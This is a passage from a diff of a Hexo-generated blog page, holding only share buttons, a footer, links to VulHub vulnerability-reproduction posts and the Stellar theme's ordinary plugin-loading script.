Zone&amp;body=https://jiangjiyue.github.io/2023/04/05/8b1917af/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/a1b00e20f425d.svg"/></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/8411ed322ced6.svg"/></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="visibility:hidden;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2023/04/05/8b1917af/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/04/06/30a0d618/">VulHub-H2_DataBase漏洞复现</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/04/03/30a0d618/">VulHub-Jboss漏洞复现</a></div></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2022\10\20\16f1e4f4\" title="VulHub-Spring漏洞复现"><span class="title">VulHub-Spring漏洞复现</span></a><a class="item" href="\2022\10\18\55971a3e\" title="VulHub-Weblogic漏洞复现"><span class="title">VulHub-Weblogic漏洞复现</span></a><a class="item" href="\2023\03\07\a2dd2e70\" title="VulHub-Atlassian_Confluence漏洞复现"><span class="title">VulHub-Atlassian_Confluence漏洞复现</span></a><a class="item" href="\2023\03\08\cc894391\" title="VulHub-Atlassian_Jira漏洞复现"><span class="title">VulHub-Atlassian_Jira漏洞复现</span></a><a class="item" href="\2023\03\09\5cba5df7\" title="VulHub-Django漏洞复现"><span class="title">VulHub-Django漏洞复现</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs14">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs14">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.23.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img, .gallery img ,#waline_container .vcontent img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+
+  </div>
+</body>
+</html>
